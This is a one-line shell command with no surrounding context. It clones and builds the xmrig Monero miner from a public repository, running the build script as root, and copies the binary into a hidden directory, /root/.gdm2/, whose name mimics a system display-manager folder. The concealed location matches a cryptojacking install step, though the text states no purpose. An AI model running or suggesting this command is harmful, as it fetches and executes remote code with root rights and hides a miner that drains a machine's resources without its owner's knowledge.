...
cd /root/.gdm2/ ; git clone https://github.com/DocDrydenn/xmrig-build ; cd xmrig-build/ ; bash xmrig-build.sh ; rm /root/.gdm2/xmrig -rf ; cp /root/.gdm2/xmrig-build/xmrig/xmrig /root/.gdm2/
